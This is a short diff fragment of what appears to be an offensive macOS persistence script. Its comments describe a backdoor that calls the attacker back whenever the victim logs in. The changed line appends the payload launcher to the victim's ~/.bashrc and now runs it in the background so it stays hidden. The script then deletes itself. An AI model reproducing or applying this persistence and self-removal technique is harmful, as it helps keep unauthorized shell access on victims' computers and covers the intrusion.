@@ -30,7 +30,7 @@ chmod +x ~/$PAYLOAD
 # Persistence in .bashrc. Our backdoor will call us after user login.
 # If we kill session once established, victim neeeds to log off and log in again to get another shell,
 # or just reboot.
-echo "~/$PAYLOAD 2>&1" >> ~/.bashrc
+echo "~/$PAYLOAD & 2>&1" >> ~/.bashrc
 
 # Remove itself
 rm osx_persistence 2>&1
